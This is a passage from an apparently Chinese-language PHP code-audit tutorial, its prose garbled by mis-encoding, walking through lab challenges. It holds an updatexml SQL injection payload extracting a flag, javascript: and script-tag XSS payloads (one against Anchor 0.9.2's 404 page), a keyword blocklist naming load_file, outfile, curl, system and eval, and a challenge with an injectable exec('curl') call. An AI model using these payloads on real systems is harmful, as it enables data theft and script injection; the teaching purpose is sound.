class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$id</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;id <span class="subst">$id</span> is not in whitelist.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;<span class="subst">$key</span>&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&lt;center&gt;<span class="subst">$value</span>&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$conn</span>-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;day1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stop_hack</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;</span>;</span><br><span class="line"><span class="variable">$back_list</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$back_list</span> <span class="keyword">as</span> <span class="variable">$hack</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$hack</span>/i&quot;</span>, <span class="variable">$value</span>))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;<span class="subst">$hack</span> detected!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é¢˜ç›®å¯ä»¥çœ‹å‡ºï¼Œé¦–å…ˆéœ€è¦ç»•è¿‡in_arrayä¹‹åç”±äºsqlè¯­å¥è¿‡æ»¤ï¼Œéœ€è¦è€ƒè™‘ç»•è¿‡ã€‚å‰è€…åŠ ä¸ªæ•°å­—å°±å¥½ï¼Œåè€…å¯ä»¥ç”¨ updatexml æ³¨å…¥ã€‚å½“ updatexml ä¸­å­˜åœ¨ç‰¹æ®Šå­—ç¬¦æˆ–å­—æ¯æ—¶ï¼Œä¼šå‡ºç°æŠ¥é”™ï¼ŒæŠ¥é”™ä¿¡æ¯ä¸ºç‰¹æ®Šå­—ç¬¦ã€å­—æ¯åŠä¹‹åçš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„æ•°æ®æ˜¯æ•°å­—å¼€å¤´ï¼Œä¾‹å¦‚ 7701HongRi ï¼Œé‚£ä¹ˆæŸ¥è¯¢ç»“æœåªä¼šæ˜¾ç¤º HongRi ã€‚æ‰€ä»¥æˆ‘ä»¬ä¼šçœ‹åˆ°å¾ˆå¤š updatexml æ³¨å…¥çš„ payload æ˜¯é•¿è¿™æ ·çš„ and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) ,åœ¨æ‰€è¦æŸ¥è¯¢çš„æ•°æ®å‰é¢å‡­å€Ÿä¸€ä¸ªç‰¹æ®Šç¬¦å·(è¿™é‡Œçš„ 0x7e ä¸ºç¬¦å· â€˜<del>â€˜ )ã€‚ä½¿ç”¨ä¸‹é¢çš„payloadå¯ä»¥è·å¾—é¢˜è§£ï¼š<br>&#96;<a href="http://localhost/index.php?id=4">http://localhost/index.php?id=4</a> and (select updatexml(1,make_set(3,â€™</del>â€˜,(select flag from flag)),1))&#96;</p><h2 id="Twig-è¿‡æ»¤ä¸å……åˆ†"><a href="#Twig-è¿‡æ»¤ä¸å……åˆ†" class="headerlink" title="Twig è¿‡æ»¤ä¸å……åˆ†"></a>Twig è¿‡æ»¤ä¸å……åˆ†</h2><p>é¢˜ç›®å«åšTwigï¼Œä»£ç å¦‚ä¸‹ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-5.png"><br><strong>æ¼æ´è§£æ</strong> ï¼š<br>è¿™ä¸€å…³é¢˜ç›®å®é™…ä¸Šç”¨çš„æ˜¯PHPçš„ä¸€ä¸ªæ¨¡æ¿å¼•æ“ <a href="https://twig.symfony.com/">Twig</a> ï¼Œæœ¬é¢˜è€ƒå¯ŸXSS(è·¨ç«™è„šæœ¬æ”»å‡»)æ¼æ´ã€‚è™½ç„¶é¢˜ç›®ä»£ç åˆ†åˆ«ç”¨äº† <strong>escape</strong> å’Œ <strong>filter_var</strong> ä¸¤ä¸ªè¿‡æ»¤æ–¹æ³•ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥è¢«æ”»å‡»è€…ç»•è¿‡ã€‚åœ¨ä¸Šå›¾ <strong>ç¬¬8è¡Œ</strong> ä¸­ï¼Œç¨‹åºä½¿ç”¨ <a href="https://twig.symfony.com/">Twig</a> æ¨¡æ¿å¼•æ“å®šä¹‰çš„ <strong>escape</strong> è¿‡æ»¤å™¨æ¥è¿‡æ»¤linkï¼Œè€Œå®é™…ä¸Šè¿™é‡Œçš„ <strong>escape</strong> è¿‡æ»¤å™¨ï¼Œæ˜¯ç”¨PHPå†…ç½®å‡½æ•° <strong>htmlspecialchars</strong> æ¥å®ç°çš„ï¼Œå…·ä½“å¯ä»¥ç‚¹å‡» <a href="https://twig.symfony.com/doc/2.x/filters/escape.html">è¿™é‡Œ</a> äº†è§£ <strong>escape</strong> è¿‡æ»¤å™¨ï¼Œ <strong>htmlspecialchars</strong> å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p><blockquote><p><a href="http://php.net/manual/zh/function.htmlspecialchars.php"> <strong>htmlspecialchars</strong> </a> ï¼š(PHP 4, PHP 5, PHP 7)</p><p><strong>åŠŸèƒ½</strong> ï¼šå°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“</p><p><strong>å®šä¹‰</strong> ï¼šstring <strong>htmlspecialchars</strong> ( string <code>$string</code> [, int <code>$flags</code> &#x3D; ENT_COMPAT | ENT_HTML401 [, string<code>$encoding</code> &#x3D; ini_get(â€œdefault_charsetâ€) [, bool <code>$double_encode</code> &#x3D; <strong>TRUE</strong> ]]] )</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; (&amp; ç¬¦å·)  ===============  &amp;amp;</span><br><span class="line"><span class="string">&quot; (åŒå¼•å·)  ===============  &amp;quot;</span></span><br><span class="line"><span class="string">&#x27; (å•å¼•å·)  ===============  &amp;apos;</span></span><br><span class="line"><span class="string">&lt; (å°äºå·)  ===============  &amp;lt;</span></span><br><span class="line"><span class="string">&gt; (å¤§äºå·)  ===============  &amp;gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå¤„è¿‡æ»¤åœ¨ <strong>ç¬¬17è¡Œ</strong> ï¼Œè¿™é‡Œç”¨äº† <strong>filter_var</strong> å‡½æ•°æ¥è¿‡æ»¤ <strong>nextSlide</strong> å˜é‡ï¼Œä¸”ç”¨äº† <strong>FILTER_VALIDATE_URL</strong> è¿‡æ»¤å™¨æ¥åˆ¤æ–­æ˜¯å¦æ˜¯ä¸€ä¸ªåˆæ³•çš„urlï¼Œå…·ä½“çš„ <strong>filter_var</strong> å®šä¹‰å¦‚ä¸‹ï¼š<br><a href="http://php.net/manual/zh/function.filter-var.php"> <strong>filter_var</strong> </a>ï¼š (PHP 5 &gt;&#x3D; 5.2.0, PHP 7)</p><p><strong>åŠŸèƒ½</strong> ï¼šä½¿ç”¨ç‰¹å®šçš„è¿‡æ»¤å™¨è¿‡æ»¤ä¸€ä¸ªå˜é‡</p><p><strong>å®šä¹‰</strong> ï¼š<a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <strong>filter_var</strong> ( <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$variable</code> [, int <code>$filter</code> &#x3D; FILTER_DEFAULT [, <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$options</code> ]] )<br><strong>å‡½æ•°åŸå‹</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">mixed</span> <span class="title function_ invoke__">filter_var</span> ( <span class="keyword">mixed</span> <span class="variable">$variable</span> [, <span class="keyword">int</span> <span class="variable">$filter</span> = FILTER_DEFAULT [, <span class="keyword">mixed</span> <span class="variable">$options</span> ]] )</span><br></pre></td></tr></table></figure><ul><li><strong>$variable</strong>: è¦è¿‡æ»¤çš„å˜é‡ã€‚</li><li><strong>$filter</strong>: ç”¨äºè¿‡æ»¤çš„è¿‡æ»¤å™¨ IDã€‚å¦‚æœä¸æä¾›ï¼Œé»˜è®¤ä¸º <code>FILTER_DEFAULT</code>ã€‚</li><li><strong>$options</strong>: ä¸€ä¸ªå…³è”æ•°ç»„æˆ–å•ä¸€çš„æ ‡å¿—ï¼ŒæŒ‡å®šé¢å¤–çš„è¿‡æ»¤å™¨é€‰é¡¹å’Œæ ‡å¿—ã€‚<br>å¸¸ç”¨çš„è¿‡æ»¤å™¨é€‰é¡¹<br>PHP æä¾›äº†å¤šç§è¿‡æ»¤å™¨ï¼Œå¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼šéªŒè¯è¿‡æ»¤å™¨å’Œæ¸…ç†è¿‡æ»¤å™¨ã€‚éªŒè¯è¿‡æ»¤å™¨ç”¨äºéªŒè¯æ•°æ®æ ¼å¼ï¼Œå¦‚æœæ•°æ®æ— æ•ˆï¼Œåˆ™è¿”å› <code>false</code>ï¼›æ¸…ç†è¿‡æ»¤å™¨ç”¨äºæ¸…ç†æ•°æ®ï¼Œå¦‚å»é™¤éæ³•å­—ç¬¦ç­‰ã€‚<br>éªŒè¯è¿‡æ»¤å™¨</li><li><strong>FILTER_VALIDATE_BOOLEAN</strong>: éªŒè¯å¸ƒå°”å€¼ã€‚</li><li><strong>FILTER_VALIDATE_EMAIL</strong>: éªŒè¯ç”µå­é‚®ä»¶åœ°å€ã€‚</li><li><strong>FILTER_VALIDATE_FLOAT</strong>: éªŒè¯æµ®ç‚¹æ•°ã€‚</li><li><strong>FILTER_VALIDATE_INT</strong>: éªŒè¯æ•´æ•°ã€‚</li><li><strong>FILTER_VALIDATE_IP</strong>: éªŒè¯ IP åœ°å€ã€‚</li><li><strong>FILTER_VALIDATE_URL</strong>: éªŒè¯ URLã€‚</li></ul><p>æ¸…ç†è¿‡æ»¤å™¨</p><ul><li><strong>FILTER_SANITIZE_EMAIL</strong>: æ¸…ç†ç”µå­é‚®ä»¶åœ°å€ï¼ˆå»é™¤æ‰€æœ‰é™¤å­—æ¯ã€æ•°å­—ä»¥åŠ<code>!#$%&amp;&#39;*+-/=?^_</code>{|}~@.[]&#96;ä¹‹å¤–çš„å­—ç¬¦ï¼‰ã€‚</li><li><strong>FILTER_SANITIZE_NUMBER_INT</strong>: æ¸…ç†æ•´æ•°ï¼ˆå»é™¤æ‰€æœ‰é™¤æ•°å­—ã€åŠ å·ã€å‡å·ä¹‹å¤–çš„å­—ç¬¦ï¼‰ã€‚</li><li><strong>FILTER_SANITIZE_SPECIAL_CHARS</strong>: å°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚</li><li><strong>FILTER_SANITIZE_STRING</strong>: å»é™¤æ ‡ç­¾å¹¶å»é™¤æˆ–ç¼–ç ç‰¹æ®Šå­—ç¬¦ã€‚</li></ul><p>éªŒè¯ç”µå­é‚®ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="variable">$email</span> = <span class="string">&quot;user@example.com&quot;</span>;</span><br><span class="line">&gt;<span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$email</span>, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;This (<span class="subst">&#123;$email&#125;</span>) is a valid email address.&quot;</span>;</span><br><span class="line">&gt;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;This (<span class="subst">&#123;$email&#125;</span>) is not a valid email address.&quot;</span>;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p>æ¸…ç†å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="variable">$string</span> = <span class="string">&quot;&lt;h1&gt;Hello, World!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$sanitized_string</span> = <span class="title function_ invoke__">filter_var</span>(<span class="variable">$string</span>, FILTER_SANITIZE_STRING);</span><br><span class="line">&gt;<span class="keyword">echo</span> <span class="variable">$sanitized_string</span>; <span class="comment">// è¾“å‡º: Hello, World!</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨é€‰é¡¹å’Œæ ‡å¿—<br><code>filter_var()</code> è¿˜å¯ä»¥ä½¿ç”¨ç¬¬ä¸‰ä¸ªå‚æ•° <code>$options</code> æ¥æä¾›é¢å¤–çš„æŒ‡ä»¤ï¼Œæ¯”å¦‚åœ¨éªŒè¯æ•´æ•°æ—¶è®¾ç½®æœ€å°å’Œæœ€å¤§å€¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">&quot;options&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">       <span class="string">&quot;min_range&quot;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">       <span class="string">&quot;max_range&quot;</span> =&gt; <span class="number">100</span></span><br><span class="line">   )</span><br><span class="line">&gt;);</span><br><span class="line">&gt;<span class="variable">$number</span> = <span class="number">50</span>;</span><br><span class="line">&gt;<span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$number</span>, FILTER_VALIDATE_INT, <span class="variable">$options</span>)) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;The number is within the accepted range.&quot;</span>;</span><br><span class="line">&gt;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;The number is not within the accepted range.&quot;</span>;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure></blockquote><p>é’ˆå¯¹è¿™ä¸¤å¤„çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨ <strong>javascriptä¼ªåè®®</strong> æ¥ç»•è¿‡ã€‚ä¸ºäº†è®©å¤§å®¶æ›´å¥½ç†è§£ï¼Œè¯·çœ‹ä¸‹é¢çš„demoä»£ç ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-6.png"></p><p>æˆ‘ä»¬ä½¿ç”¨ <strong>payload</strong> ï¼š<code>?nextSlide=javascript://commentï¼…250aalert(1)</code> ï¼Œå¯ä»¥æ‰§è¡Œ <strong>alert</strong> å‡½æ•°ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-7.png"><br>å®é™…ä¸Šï¼Œè¿™é‡Œçš„ <strong>&#x2F;&#x2F;</strong> åœ¨JavaScriptä¸­è¡¨ç¤ºå•è¡Œæ³¨é‡Šï¼Œæ‰€ä»¥åé¢çš„å†…å®¹å‡ä¸ºæ³¨é‡Šï¼Œé‚£ä¸ºä»€ä¹ˆä¼šæ‰§è¡Œ <strong>alert</strong> å‡½æ•°å‘¢ï¼Ÿé‚£æ˜¯å› ä¸ºæˆ‘ä»¬è¿™é‡Œç”¨äº†å­—ç¬¦ <strong>%0a</strong> ï¼Œè¯¥å­—ç¬¦ä¸ºæ¢è¡Œç¬¦ï¼Œæ‰€ä»¥ <strong>alert</strong> è¯­å¥ä¸æ³¨é‡Šç¬¦ <strong>&#x2F;&#x2F;</strong> å°±ä¸åœ¨åŒä¸€è¡Œï¼Œå°±èƒ½æ‰§è¡Œã€‚å½“ç„¶ï¼Œè¿™é‡Œæˆ‘ä»¬è¦å¯¹ <strong>%</strong> ç™¾åˆ†å·ç¼–ç æˆ <strong>%25</strong> ï¼Œå› ä¸ºç¨‹åºå°†æµè§ˆå™¨å‘æ¥çš„payloadï¼š<code>javascript://commentï¼…250aalert(1)</code> å…ˆè§£ç æˆï¼š <code>javascript://comment%0aalert(1)</code> å­˜å‚¨åœ¨å˜é‡ <strong>$url</strong> ä¸­ï¼ˆä¸Šå›¾ç¬¬äºŒè¡Œä»£ç ï¼‰ï¼Œç„¶åç”¨æˆ·ç‚¹å‡»aæ ‡ç­¾é“¾æ¥å°±ä¼šè§¦å‘ <strong>alert</strong> å‡½æ•°ã€‚</p><h3 id="å®ä¾‹åˆ†æ"><a href="#å®ä¾‹åˆ†æ" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h3><p>æœ¬æ¬¡å®ä¾‹åˆ†æï¼Œæˆ‘ä»¬é€‰å–çš„æ˜¯ <strong>Anchor 0.9.2</strong> ç‰ˆæœ¬ï¼Œåœ¨è¯¥ç‰ˆæœ¬ä¸­ï¼Œå½“ç”¨æˆ·è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„URLé“¾æ¥æ—¶ï¼Œç¨‹åºä¼šè°ƒç”¨404æ¨¡æ¿ï¼Œè€Œè¿™ä¸ªæ¨¡æ¿åˆ™å­˜åœ¨XSSæ¼æ´ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-8.png"><br>è¯¥ä»£ç åœ¨ <strong>themes\default\404.php</strong> ä¸­ï¼Œçœ‹ç¬¬4è¡Œ <strong>code</strong> æ ‡ç­¾ä¸­çš„ <strong>current_url</strong> å‡½æ•°ï¼Œæˆ‘ä»¬å¯åœ¨ <strong>anchor\functions\helpers.php</strong> æ–‡ä»¶ä¸­ï¼Œçœ‹åˆ° <strong>current_url</strong> å‡½æ•°æ˜¯ç”± <strong>Uri</strong> ç±»çš„  <strong>current</strong> æ–¹æ³•å®ç°çš„ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">current_url</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title class_">Uri</span>::<span class="title function_ invoke__">current</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è·Ÿè¿›åˆ° <strong>Uri</strong> ç±»ï¼Œåœ¨ <strong>system\uri.php</strong> æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å‘ç°è¿™é‡Œè°ƒç”¨äº† <strong>static::detect</strong> æ–¹æ³•( <strong>statci::</strong> æ˜¯åœ¨PHP5.3ç‰ˆæœ¬ä¹‹åå¼•å…¥çš„å»¶è¿Ÿé™æ€ç»‘å®šå†™æ³•)ã€‚<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-9.png"></p><p>åœ¨ <strong>current</strong> æ–¹æ³•ä¸‹é¢ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰¾åˆ° <strong>detect</strong> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šè·å– <strong>$_SERVER</strong> æ•°ç»„ä¸­çš„ <strong>â€˜REQUEST_URIâ€™ ã€â€™PATH_INFOâ€™, ã€â€™ORIG_PATH_INFOâ€™</strong> ä¸‰ä¸ªé”®çš„å€¼(ä¸‹å›¾ç¬¬3-4è¡Œä»£ç )ï¼Œå¦‚æœå­˜åœ¨å…¶ä¸­çš„æŸä¸€ä¸ªé”®ï¼Œå¹¶ä¸”ç¬¦åˆ <strong>filter_var($uri, FILTER_SANITIZE_URL)</strong> å’Œ <strong>parse_url($uri, PHP_URL_PATH)</strong> ï¼Œåˆ™ç›´æ¥å°† <strong>$uri</strong> ä¼ å…¥ <strong>static::format</strong> æ–¹æ³•ï¼Œä¸‹å›¾ç¬¬10-14è¡Œä»£ç ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-10.png"><br>æˆ‘ä»¬è·Ÿè¿› <strong>static::format</strong> æ–¹æ³•ï¼Œå¯ä»¥å‘ç°ç¨‹åºè¿‡æ»¤äº†ä¸‰æ¬¡(ä¸‹å›¾ç¬¬3-7è¡Œ)ï¼Œä½†æ˜¯éƒ½æ²¡æœ‰é’ˆå¯¹XSSæ”»å‡»è¿›è¡Œè¿‡æ»¤ï¼Œåªæ˜¯ä¸ºäº†è·å–ç”¨æˆ·è®¿é—®çš„æ–‡ä»¶åï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-11.png"><br>ç”±äºæ²¡æœ‰é’ˆå¯¹XSSæ”»å‡»è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´æ”»å‡»ååˆ†å®¹æ˜“ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹XSSæ”»å‡»å…·ä½“æ˜¯å¦‚ä½•è¿›è¡Œçš„ã€‚<br><strong>æ¼æ´åˆ©ç”¨</strong><br>æˆ‘ä»¬æ„é€ payloadå¦‚ä¸‹ï¼š  <code>http://localhost/anchor/index.php/&lt;script&gt;alert(&#39;www.sec-redclub.com&#39;)&lt;/script&gt;</code> ã€‚æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œå½“æˆ‘ä»¬è®¿é—®è¿™ä¸ªå¹¶ä¸å­˜åœ¨çš„é“¾æ¥æ—¶ï¼Œç¨‹åºä¼šè°ƒç”¨404æ¨¡æ¿é¡µé¢ï¼Œç„¶åè°ƒç”¨ <strong>current_url</strong> å‡½æ•°æ¥è·å–å½“å‰ç”¨æˆ·è®¿é—®çš„æ–‡ä»¶åï¼Œä¹Ÿå°±æ˜¯æœ€åä¸€ä¸ª <strong>&#x2F;</strong> ç¬¦å·åé¢çš„å†…å®¹ï¼Œæ‰€ä»¥æœ€ç»ˆpayloadé‡Œçš„ <code>&lt;script&gt;alert(&#39;www.sec-redclub.com&#39;)&lt;/script&gt;</code> éƒ¨åˆ†ä¼šåµŒå…¥åˆ° <code>&lt;code&gt;</code> æ ‡ç­¾ä¸­ï¼Œé€ æˆXSSæ”»å‡»<br><strong>ä¿®å¤å»ºè®®</strong><br>è¿™å¯¹XSSæ¼æ´ï¼Œæˆ‘ä»¬æœ€å¥½å°±æ˜¯è¿‡æ»¤å…³é”®è¯ï¼Œå°†ç‰¹æ®Šå­—ç¬¦è¿›è¡ŒHTMLå®ä½“ç¼–ç æ›¿æ¢ï¼Œè¿™é‡Œç»™å‡ºçš„ä¿®å¤ä»£ç ä¸ºDedecmsä¸­é˜²å¾¡XSSçš„æ–¹æ³•ï¼Œå¯ä»¥åœ¨ <strong>uploads&#x2F;include&#x2F;helpers&#x2F;filter.helper.php</strong> è·¯å¾„ä¸‹æ‰¾åˆ°å¯¹åº”ä»£ç ï¼Œå…·ä½“é˜²æŠ¤ä»£ç å¦‚ä¸‹ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-12.png"></p><h3 id="ä½œä¸šé¢˜ç›®-1"><a href="#ä½œä¸šé¢˜ç›®-1" class="headerlink" title="ä½œä¸šé¢˜ç›®"></a>ä½œä¸šé¢˜ç›®</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$url</span>) &amp;&amp; <span class="title function_ invoke__">filter_var</span>(<span class="variable">$url</span>, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    <span class="variable">$site_info</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sec-redclub.com$/&#x27;</span>,<span class="variable">$site_info</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;curl &quot;&#x27;</span>.<span class="variable">$site_info</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&quot;&#x27;</span>, <span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;You have curl <span class="subst">&#123;$site_info[&#x27;host&#x27;]&#125;</span> successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ¥åªéœ€è¦ç»•è¿‡ä¸¤ä¸ªéƒ¨åˆ†ï¼Œç¬¬ä¸€ä¸ªæ˜¯ filter_var çš„è¿‡æ»¤ï¼Œç¬¬äºŒä¸ªæ˜¯ preg_match å¯¹ url çš„åˆ¤æ–­ï¼Œæ˜¯å¦æ˜¯ä»¥sec-redclub.comç»“å°¾ã€‚å¯¹äºfilter_varå¯ä»¥ç”¨ä¸‹é¢çš„æ–¹å¼ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 